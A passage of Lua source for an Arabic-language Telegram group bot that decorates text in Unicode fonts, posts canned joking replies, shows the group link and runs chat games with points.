"ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,ᵃ,ᵇ,ᶜ,ᵈ,ᵉ,ᶠ,ᵍ,ʰ,ᶤ,ʲ,ᵏ,ˡ,ᵐ,ᶰ,ᵒ,ᵖ,ᵠ,ʳ,ˢ,ᵗ,ᵘ,ᵛ,ʷ,ˣ,ʸ,ᶻ,0,9,8,7,6,5,4,3,2,1,.,_",     
"ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,ᴀ,ʙ,ᴄ,ᴅ,ᴇ,ғ,ɢ,ʜ,ɪ,ᴊ,ᴋ,ʟ,ᴍ,ɴ,ᴏ,ᴘ,ǫ,ʀ,ѕ,ᴛ,ᴜ,ᴠ,ᴡ,х,ʏ,ᴢ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,Ａ,Ｂ,С,Ｄ,Ｅ,Բ,Ｇ,Ｈ,Ｉ,Ｊ,Ｋ,Ｌ,Ⅿ,Ｎ,Ｏ,Ｐ,Ｑ,Ｒ,Ｓ,Ｔ,Ｕ,Ｖ,Ｗ,Ｘ,Ｙ,Ｚ,0,9,8,7,6,5,4,3,2,1,.,_",     
"Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,Λ,Б,Ͼ,Ð,Ξ,Ŧ,₲,Ḧ,ł,J,К,Ł,Ɱ,Л,Ф,Ꝓ,Ǫ,Я,Ŝ,₮,Ǚ,Ṽ,Ш,Ж,Ẏ,Ꙃ,0,9,8,7,6,5,4,3,2,1,.,_",     }         
local result = {}     
i=0     
for k=1,#fonts do     
i=i+1     
local tar_font = fonts[i]:split(",")     
local text = ABS_PROX    
local text = text:gsub("A",tar_font[1])     
local text = text:gsub("B",tar_font[2])     
local text = text:gsub("C",tar_font[3])     
local text = text:gsub("D",tar_font[4])     
local text = text:gsub("E",tar_font[5])     
local text = text:gsub("F",tar_font[6])  
local text = text:gsub("G",tar_font[7])    
local text = text:gsub("H",tar_font[8])    
local text = text:gsub("I",tar_font[9])     
local text = text:gsub("J",tar_font[10])     
local text = text:gsub("K",tar_font[11])     
local text = text:gsub("L",tar_font[12])     
local text = text:gsub("M",tar_font[13])     
local text = text:gsub("N",tar_font[14])     
local text = text:gsub("O",tar_font[15])     
local text = text:gsub("P",tar_font[16])     
local text = text:gsub("Q",tar_font[17])     
local text = text:gsub("R",tar_font[18])     
local text = text:gsub("S",tar_font[19])     
local text = text:gsub("T",tar_font[20])     
local text = text:gsub("U",tar_font[21])     
local text = text:gsub("V",tar_font[22])     
local text = text:gsub("W",tar_font[23])     
local text = text:gsub("X",tar_font[24])     
local text = text:gsub("Y",tar_font[25])     
local text = text:gsub("Z",tar_font[26])     
local text = text:gsub("a",tar_font[27])     
local text = text:gsub("b",tar_font[28])     
local text = text:gsub("c",tar_font[29])     
local text = text:gsub("d",tar_font[30])     
local text = text:gsub("e",tar_font[31])     
local text = text:gsub("f",tar_font[32])     
local text = text:gsub("g",tar_font[33])     
local text = text:gsub("h",tar_font[34])     
local text = text:gsub("i",tar_font[35])     
local text = text:gsub("j",tar_font[36])     
local text = text:gsub("k",tar_font[37])     
local text = text:gsub("l",tar_font[38])     
local text = text:gsub("m",tar_font[39])     
local text = text:gsub("n",tar_font[40])     
local text = text:gsub("o",tar_font[41])     
local text = text:gsub("p",tar_font[42])     
local text = text:gsub("q",tar_font[43])     
local text = text:gsub("r",tar_font[44])     
local text = text:gsub("s",tar_font[45])     
local text = text:gsub("t",tar_font[46])     
local text = text:gsub("u",tar_font[47])     
local text = text:gsub("v",tar_font[48])     
local text = text:gsub("w",tar_font[49])     
local text = text:gsub("x",tar_font[50])     
local text = text:gsub("y",tar_font[51])     
local text = text:gsub("z",tar_font[52])     
local text = text:gsub("0",tar_font[53])     
local text = text:gsub("9",tar_font[54])     
local text = text:gsub("8",tar_font[55])     
local text = text:gsub("7",tar_font[56])     
local text = text:gsub("6",tar_font[57])     
local text = text:gsub("5",tar_font[58])     
local text = text:gsub("4",tar_font[59])     
local text = text:gsub("3",tar_font[60])     
local text = text:gsub("2",tar_font[61])     
local text = text:gsub("1",tar_font[62])            
table.insert(result, text)     
end     
local DevAbs22 = "❗️🚸 ⌯ ٱڵكڵمة { "..ABS_PROX.." }\n❗️🔑 ⌯ تـۖمت زخرفتهٱ ٱڵى ( "..tostring(#fonts).." ) نوع \n❗️🎗 ⌯ ٱضـغط عڵى ٱڵـكڵمة ڵـنسخهٱ\n〰️➖〰️➖〰️➖〰️➖〰️\n"
number=0     
for v=1,#result do     
number=number+1     
local ABS_PROX = { '🔥', '🔅﴿', '❥˓ ', '💝﴿', '🐼🏆', '🙊💙', '🐥📥', '😻‘','⚡️', '⁽🌷', '🔥“', '💭', '🍿','🐼💗 ', '🐝🍷','❥̚͢₎🐣', '👄‘', ' 💭ۦ',' 🎉ۦ', ' ⚡️ۦ','℡̈', '💋☄️₎ۦ˛', '♩',' ☻🔥“ٰۦ', '℡ ̇ 📥🐯⇣✦', '┇♩⁽💎🌩₎⇣✿','ٰ❥ ͢ۦ‏', '⚡️ֆ₎', '🐰☄️', '⁾❥', '✿🎃❥', '✿⇣', '❥℡🦁' }     
DevAbs22 = DevAbs22..''..number.."  `"..result[number]..''..ABS_PROX[math.random(#ABS_PROX)].."`\n\n"    
end     
Dev_Abs(msg.chat_id_, 0, 1, DevAbs22, 1, 'md')     
end     
end 
--     Source loolIQ     --
if DevAbs:get(loolIQ.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then
DevAbs:del(loolIQ.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
local nerkh = msg.content_.text_:match("(.*)")
DevAbs:set(loolIQ.."nerkh", nerkh)
if DevAbs:get(loolIQ.."lang:gp:" .. msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗🚸 ⌯ Bot *sudo* has been *Setted* ", 1, "md")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ تـۖم حفظ كڵيشة ٱڵـمطۄر", 1, "md")
end
end 
if text and text:match("^(.*)$") then
local ABS_PROX = DevAbs:get('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'')
if ABS_PROX == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حفظ ٱسم ٱڵـبـۄت ', 1, 'html')
DevAbs:set('ABS_PROX:'..bot_id..'namebot'..msg.sender_user_id_..'', 'no')
DevAbs:set('ABS_PROX:'..bot_id..'name_bot', text)
return false 
end
end
--     Source loolIQ     --
if DevAbs:get(loolIQ..'bot:cmds'..msg.chat_id_) and not is_admin(msg.sender_user_id_, msg.chat_id_) then
print("Return False [Lock] [Cmd]")

else  
--     Source loolIQ     --
if text:match("^Ll]ink$") or text:match("^الرابط$") then
if not DevAbs:get(loolIQ.."bot:tt:link:"..msg.chat_id_) then 
local link = DevAbs:get(loolIQ.."bot:group:link"..msg.chat_id_)
if link then
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱسـم ٱڵمجـمۄعة ⌯» ⤈ \n• "..title_name(msg.chat_id_).." •\n❗️🔑 ⌯ رآبــط ٱڵمجـمۄعة ⌯» ⤈ \n• " .. link.." •", 1, "html")
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "❗️🚸 ⌯ ٱسـم ٱڵمجـمۄعة ⌯» ⤈ \n• "..title_name(msg.chat_id_).." •\n❗️🔑 ⌯ رآبــط ٱڵمجـمۄعة ⌯» ⤈ \n• " .. link.." •", 1, "md")
end
else 
if DevAbs:get(loolIQ..'lang:gp:'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ Group link is not set ! \n Plese send command Setlink and set it  ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ لم يتم تعيين رآبـط ڵـلمجـمۄعة \n ٱرسـڵ (ضع رابط) ڵـصنع رابـط جـډيـډ', 1, 'md')
end
end
else
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱڵـرٱبط معطڵ لٱ يمكنني ٱرسٱڵـه', 1, 'md')
end
end
end 
--     Source loolIQ     --
if text == 'عبس' or text == 'abs' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "ٲلمبرمج ماڵتي فديتهہ 😻💙 @[IQ_ABS]"
else 
ABS_PROX = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'دي' or text == 'ديي' or text == 'دي بابه' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "آخـلُِآقٌڪڪ لُِڪڪ 𖠙 😒🔪"
else 
ABS_PROX = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'سلام' or text == 'السلام عليكم' or text == 'سلام عليكم' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "يٱھَہّلْـٱٱ ۅﻋ̝̚لْـيڪْم ٱلْـﺳ̭͠ لْـٱم 𖠙 🤤♥️"
else 
ABS_PROX = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == '😭💔' or text == '😭😭' or text == '😭😭😭' or text == '😿💔' or text == '😭😭😭' or text == '😭😭😭😭' then      
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "مآآعٍآشُ آلُِي يزعٍلُِڪڪ 𖠙 😏♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == '🌚💔' or text == '💔🌚' or text == '🚶‍♂💔' or text == '💔' or text == '😔💔' or text == '🚶‍♀💔' or text == '😭' then      
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "شبّـيي ٱﻟ̣̣ـפﻟ̣̣ـو 𖠙 😿💔"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'باي' or text == 'بااي' or text == 'اروح' or text == 'اروح احسن' or text == 'اولي احسن' or text == 'راح اروح' or text == 'باي انام' then      
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "أُرٌجُعُ عٍيدِهـآآ مٍوو تنِْسةه 𖠙 🤤♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'هلو' or text == 'هلاو' or text == 'هلا' or text == 'هلاوو' or text == 'هيلاو' or text == 'هيلاوو' or text == 'هلاا' then      
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "اࠗط็ـلق֯ق֯ هٞللاࠗ୨و 𖠙 🤤♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'شونك' or text == 'شونج' or text == 'شلونك' or text == 'شلونج' or text == 'شونكم' or text == 'شلونكم' or text == 'شلخبار' or text == 'شلون الاخبار' or text == 'شخبارك' then      
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "مٱﺷ͠ يةھَہّ يـﻋ̝̚مريي ۅٱﻧـﺗ̲ـت 𖠙 🤤♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'وينك' or text == 'وينج' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "مْوٌجہوٌدِ يہمْگُ يحڵوُ 𖠙 😉♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'نايمين' or text == 'ميتين' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "طُآمسين ووعٍيوونڪ 𖠙 😪🖤ۦ"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'اكلك' or text == 'اكلج' or text == 'اكلكم' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "ڪوولُِ مآڪوولُِ لُِآحٍدِ 𖠙 😉♥️"
else 
ABS_PROX = ''
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'ها' or text == 'هاا' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "هـْٳ ڒٍدِيہنٳ لہوٌ لاِا 𖠙 😹♥️"
else 
ABS_PROX = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end
if text == 'سورس عبس' or text == 'سورس بروكس' or text == 'سورس ديف بروكس' or text == 'سورس زربه' then 
if not DevAbs:get(loolIQ..'bot:rep:mute'..msg.chat_id_) then
ABS_PROX =  "لُِآ سوورس خـآلُِتڪ دِي لُِڪ 𖠙 😒🔪"
else 
ABS_PROX = ''
end
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX, 1, 'md')
end 
--     Source loolIQ     --
if text == 'بوت' or text == 'بوتت' then 
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') 
local ABS_PROX = {
 "ڵتكول بوت ٱسمي "..name_bot.." 😒🔪",
 "عندي ٱسم تره 😒💔",
 "صيحوڵي "..name_bot.." كٱفي بوت 😒🔪",
 "ٱنت ٱڵبوت ڵك 😒💔",
 "راح نموتت بكوروناا وانتت بعدكك تصيح بوت 🤯💉"
}
DevAbs2 = math.random(#ABS_PROX)
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') 
end
if text == 'اسم البوت' or text == 'البوت شنو اسمه' or text == 'شسمه البوت' or text == 'البوت شسمه'  then 
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') 
local ABS_PROX = {
 "مرحبٱ عزيزي 😻♥️ \nٱسمي "..name_bot.." 😚♥️",
}
DevAbs2 = math.random(#ABS_PROX)
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') 
end
if text ==  ""..name_bot..' احبك' then
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس') 
local ABS_PROX = {
 "اعشقكك يروح "..name_bot.." 😻♥️",
 "جعل محد غيركك يحبني 😻♥️"
}
DevAbs2 = math.random(#ABS_PROX)
Dev_Abs(msg.chat_id_, msg.id_, 1, ABS_PROX[DevAbs2] , 1, 'md') 
end
if (text and text == (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')) then
name_bot = (DevAbs:get('ABS_PROX:'..bot_id..'name_bot') or 'بروكس')
local namebot = { 
 '😸♥️ هلٱ كڵبي ويٱك '..name_bot..' تفضڵ',
 'ترةه مصختهٱا ٱحجيي شرٱيد 😕😒💔',
 'ٱطڵقق وٱحدد يصيح '..name_bot..' 😻♥️',
 'خبصتت ٱمنةة شتريدد عٱاد 🤧😒💔'
}
name = math.random(#namebot)
Dev_Abs(msg.chat_id_, msg.id_, 1, namebot[name] , 1, 'md') 
return false end
--     Source loolIQ     --
if text =='نقاطي' then 
if tonumber((DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_) or 0)) == 0 then
DevAbs0 = '❗️🚸 ⌯ ڵيس ڵديك نقٱط ٱڵعب ٱولٱ \n❗️🔑 ⌯ ٱرسڵ ( الالعاب ) ڵڵعب'
Dev_Abs(msg.chat_id_, msg.id_, 1,DevAbs0, 1, 'md')
else 
ABS_PROX = '❗️🚸 ⌯ ڵديك { '..(DevAbs:get(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_))..' } من نقٱط ٱڵعب '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end
end
if text ==  'حذف رسائلي' or text ==  'مسح رسائلي' then
DevAbs:del('ABS_PROX:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ تـۖم حذف رسٱئڵك ٱڵمضٱفة', 1, 'md')
end
if text == 'سمايلات' or text == 'السمايلات' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:ids'..msg.chat_id_)
DevAbs2 = {'🍏','🍎','🍐','🍊','🍋','🍌','🍉','🍇','🍓','🍈','🍒','🍑','🍍','🥥','🥝','🍅','🍆','🥑','🥦','🥒','🌶','🌽','🥕','🥔','🍠','🥐','🍞','🥖','🥨','🧀','🥚','🍳','🥞','🥓','🥩','🍗','🍖','🌭','🍔','🍟','🍕','🥪','🥙','🍼','☕️','🍵','🥤','🍶','🍺','🍻','🏀','⚽️','🏈','⚾️','🎾','🏐','🏉','🎱','🏓','🏸','🥅','🎰','🎮','🎳','🎯','🏆','🎻','🎸','🎺','🥁','🎹','🎼','🎧','🎤','🎬','🎨','🎭','🎪','🛎','📤','🎗','🏵','🎖','🏆','🥌','🛷','🚕','🚗','🚙','🚌','🚎','🏎','🚓','🚑','🚚','🚛','🚜','🇮🇶','⚔️','🛡','🔮','🌡','💣','⏱','🛢','📓','📗','📂','📅','📪','📫','📬','📭','⏰','📺','🎚','☎️','📡'}
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:klmos'..msg.chat_id_,name)
name = string.gsub(name,'🍞','🍞')
name = string.gsub(name,'🥖','🥖')
name = string.gsub(name,'🥨','🥨')
name = string.gsub(name,'🧀','🧀')
name = string.gsub(name,'🥚','🥚')
name = string.gsub(name,'🍳','🍳')
name = string.gsub(name,'🥞','🥞')
name = string.gsub(name,'🥓','🥓')
name = string.gsub(name,'🥩','🥩')
name = string.gsub(name,'🍗','🍗')
name = string.gsub(name,'🍖','🍖')
name = string.gsub(name,'🌭','🌭')
name = string.gsub(name,'🍔','🍔')
name = string.gsub(name,'🍟','🍟')
name = string.gsub(name,'🍕','🍕')
name = string.gsub(name,'🥪','🥪')
name = string.gsub(name,'🥙','🥙')
name = string.gsub(name,'🍼','🍼')
name = string.gsub(name,'☕️','☕️')
name = string.gsub(name,'🍵','🍵')
name = string.gsub(name,'🥤','🥤')
name = string.gsub(name,'🍶','🍶')
name = string.gsub(name,'🍺','🍺')
name = string.gsub(name,'🍏','🍏')
name = string.gsub(name,'🍎','🍎')
name = string.gsub(name,'🍐','🍐')
name = string.gsub(name,'🍊','🍊')
name = string.gsub(name,'🍋','🍋')
name = string.gsub(name,'🍌','🍌')
name = string.gsub(name,'🍉','🍉')
name = string.gsub(name,'🍇','🍇')
name = string.gsub(name,'🍓','🍓')
name = string.gsub(name,'🍈','🍈')
name = string.gsub(name,'🍒','🍒')
name = string.gsub(name,'🍑','🍑')
name = string.gsub(name,'🍍','🍍')
name = string.gsub(name,'🥥','🥥')
name = string.gsub(name,'🥝','🥝')
name = string.gsub(name,'🍅','🍅')
name = string.gsub(name,'🍆','🍆')
name = string.gsub(name,'🥑','🥑')
name = string.gsub(name,'🥦','🥦')
name = string.gsub(name,'🥒','🥒')
name = string.gsub(name,'🌶','🌶')
name = string.gsub(name,'🌽','🌽')
name = string.gsub(name,'🥕','🥕')
name = string.gsub(name,'🥔','🥔')
name = string.gsub(name,'🍠','🍠')
name = string.gsub(name,'🥐','🥐')
name = string.gsub(name,'🍻','🍻')
name = string.gsub(name,'🏀','🏀')
name = string.gsub(name,'⚽️','⚽️')
name = string.gsub(name,'🏈','🏈')
name = string.gsub(name,'⚾️','⚾️')
name = string.gsub(name,'🎾','🎾')
name = string.gsub(name,'🏐','🏐')
name = string.gsub(name,'🏉','🏉')
name = string.gsub(name,'🎱','🎱')
name = string.gsub(name,'🏓','🏓')
name = string.gsub(name,'🏸','🏸')
name = string.gsub(name,'🥅','🥅')
name = string.gsub(name,'🎰','🎰')
name = string.gsub(name,'🎮','🎮')
name = string.gsub(name,'🎳','🎳')
name = string.gsub(name,'🎯','🎯')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🎻','🎻')
name = string.gsub(name,'🎸','🎸')
name = string.gsub(name,'🎺','🎺')
name = string.gsub(name,'🥁','🥁')
name = string.gsub(name,'🎹','🎹')
name = string.gsub(name,'🎼','🎼')
name = string.gsub(name,'🎧','🎧')
name = string.gsub(name,'🎤','🎤')
name = string.gsub(name,'🎬','🎬')
name = string.gsub(name,'🎨','🎨')
name = string.gsub(name,'🎭','🎭')
name = string.gsub(name,'🎪','🎪')
name = string.gsub(name,'🛎','🛎')
name = string.gsub(name,'📤','📤')
name = string.gsub(name,'🎗','🎗')
name = string.gsub(name,'🏵','🏵')
name = string.gsub(name,'🎖','🎖')
name = string.gsub(name,'🏆','🏆')
name = string.gsub(name,'🥌','🥌')
name = string.gsub(name,'🛷','🛷')
name = string.gsub(name,'🚕','🚕')
name = string.gsub(name,'🚗','🚗')
name = string.gsub(name,'🚙','🚙')
name = string.gsub(name,'🚌','🚌')
name = string.gsub(name,'🚎','🚎')
name = string.gsub(name,'🏎','🏎')
name = string.gsub(name,'🚓','🚓')
name = string.gsub(name,'🚑','🚑')
name = string.gsub(name,'🚚','🚚')
name = string.gsub(name,'🚛','🚛')
name = string.gsub(name,'🚜','🚜')
name = string.gsub(name,'🇮🇶','🇮🇶')
name = string.gsub(name,'⚔️','⚔️')
name = string.gsub(name,'🛡','🛡')
name = string.gsub(name,'🔮','🔮')
name = string.gsub(name,'🌡','🌡')
name = string.gsub(name,'💣','💣')
name = string.gsub(name,'⏱','⏱')
name = string.gsub(name,'🛢','🛢')
name = string.gsub(name,'📓','📒')
name = string.gsub(name,'📗','📗')
name = string.gsub(name,'📂','🗂')
name = string.gsub(name,'📅','📆')
name = string.gsub(name,'📪','📪')
name = string.gsub(name,'📫','📫')
name = string.gsub(name,'📬','📬')
name = string.gsub(name,'📭','📭')
name = string.gsub(name,'⏰','⏰')
name = string.gsub(name,'📺','📺')
name = string.gsub(name,'🎚','🎚')
name = string.gsub(name,'☎️','☎️')
ABS_PROX = '❗️🚸 ⌯ ٱوڵ وٱحد يدز هذٱ ٱڵسمٱيڵ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:klmos'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:ids'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:ids'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( سمايلات ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:ids'..msg.chat_id_,true)
end
if text == 'ترتيب' or text == 'الترتيب' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
DevAbs:del(loolIQ..'bot:l:id'..msg.chat_id_)
DevAbs2 = {'سحور','سياره','استقبال','قنفه','ايفون','بزونه','مطبخ','كرستيانو','دجاجه','مدرسه','الوان','غرفه','ثلاجه','كهوه','سفينه','العراق','محطه','طياره','رادار','منزل','مستشفى','كهرباء','تفاحه','اخطبوط','سلمون','فرنسا','برتقاله','تفاح','مطرقه','بتيته','لهانه','شباك','باص','سمكه','ذباب','تلفاز','حاسوب','انترنيت','ساحه','جسر'};
name = DevAbs2[math.random(#DevAbs2)]
DevAbs:set(loolIQ..'bot:klmo'..msg.chat_id_,name)
name = string.gsub(name,'سحور','س ر و ح')
name = string.gsub(name,'سياره','ه ر س ي ا')
name = string.gsub(name,'استقبال','ل ب ا ت ق س ا')
name = string.gsub(name,'قنفه','ه ق ن ف')
name = string.gsub(name,'ايفون','و ن ف ا')
name = string.gsub(name,'بزونه','ز و ه ن')
name = string.gsub(name,'مطبخ','خ ب ط م')
name = string.gsub(name,'كرستيانو','س ت ا ن و ك ر ي')
name = string.gsub(name,'دجاجه','ج ج ا د ه')
name = string.gsub(name,'مدرسه','ه م د ر س')
name = string.gsub(name,'الوان','ن ا و ا ل')
name = string.gsub(name,'غرفه','غ ه ر ف')
name = string.gsub(name,'ثلاجه','ج ه ت ل ا')
name = string.gsub(name,'كهوه','ه ك ه و')
name = string.gsub(name,'سفينه','ه ن ف ي س')
name = string.gsub(name,'العراق','ق ع ا ل ر ا')
name = string.gsub(name,'محطه','ه ط م ح')
name = string.gsub(name,'طياره','ر ا ط ي ه')
name = string.gsub(name,'رادار','ر ا ر ا د')
name = string.gsub(name,'منزل','ن ز م ل')
name = string.gsub(name,'مستشفى','ى ش س ف ت م')
name = string.gsub(name,'كهرباء','ر ب ك ه ا ء')
name = string.gsub(name,'تفاحه','ح ه ا ت ف')
name = string.gsub(name,'اخطبوط','ط ب و ا خ ط')
name = string.gsub(name,'سلمون','ن م و ل س')
name = string.gsub(name,'فرنسا','ن ف ر س ا')
name = string.gsub(name,'برتقاله','ر ت ق ب ا ه ل')
name = string.gsub(name,'تفاح','ح ف ا ت')
name = string.gsub(name,'مطرقه','ه ط م ر ق')
name = string.gsub(name,'بتيته','ب ت ت ي ه')
name = string.gsub(name,'لهانه','ه ن ل ه ل')
name = string.gsub(name,'شباك','ب ش ا ك')
name = string.gsub(name,'باص','ص ا ب')
name = string.gsub(name,'سمكه','ك س م ه')
name = string.gsub(name,'ذباب','ب ا ب ذ')
name = string.gsub(name,'تلفاز','ت ف ل ز ا')
name = string.gsub(name,'حاسوب','س ا ح و ب')
name = string.gsub(name,'انترنيت','ا ت ن ر ن ي ت')
name = string.gsub(name,'ساحه','ح ا ه س')
name = string.gsub(name,'جسر','ر ج س')
ABS_PROX = '❗️🚸 ⌯ ٱوڵ وٱحد يرتبهٱ {'..name..'} يربح '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
end end
if text == ''..(DevAbs:get(loolIQ..'bot:klmo'..msg.chat_id_) or 'qssp')..'' and not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then
if not DevAbs:get(loolIQ..'bot:l:id'..msg.chat_id_) then 
ABS_PROX = '❗️🚸 ⌯ ڵقد ربحت وحصڵت عڵى نقطة \n❗️🔑 ⌯ ٱرسڵ ( ترتيب ) ڵڵعب مره ٱخرى \n '
Dev_Abs(msg.chat_id_, msg.id_, 1,ABS_PROX, 1, 'md')
DevAbs:incrby(loolIQ..'bot:add:num'..msg.chat_id_..msg.sender_user_id_, 1)  
end
DevAbs:set(loolIQ..'bot:l:id'..msg.chat_id_,true)
end
if text == 'محيبس' or text == 'بات' or text == 'المحيبس' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '❗️🚸 ⌯ ٱلٱڵعٱب معطڵة \n❗️🔑 ⌯ ٱرسڵ ( تفعيل الالعاب ) ڵڵعب ', 1, 'md')
else
Num = math.random(1,6)
DevAbs:set(loolIQ.."GAMES"..msg.chat_id_,Num) 
TEST = [[
➀       ➁       ➂       ➃       ➄       ➅
↓       ↓       ↓       ↓       ↓       ↓
👊 ‹› 👊🏻 ‹› 👊🏼 ‹› 👊🏽 ‹› 👊🏾 ‹› 👊🏿


❗️🚸 ⌯ ٱختر رقم ٱڵيد
❗️🔑 ⌯ لٱستخرٱج ٱڵمحيبس
❗️🎗 ⌯ ٱڵفٱئز يحصڵ عڵى ( 5 ) نقٱط
]]
Dev_Abs( msg.chat_id_, msg.id_, 1, TEST, 1, "md") 
DevAbs:setex(loolIQ.."SET:GAME" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 100, true)  
return false  
end end
if text == 'حزوره' or text == 'الحزوره' then
if not DevAbs:get(loolIQ..'bot:lock_geam'..msg.chat_id_) then
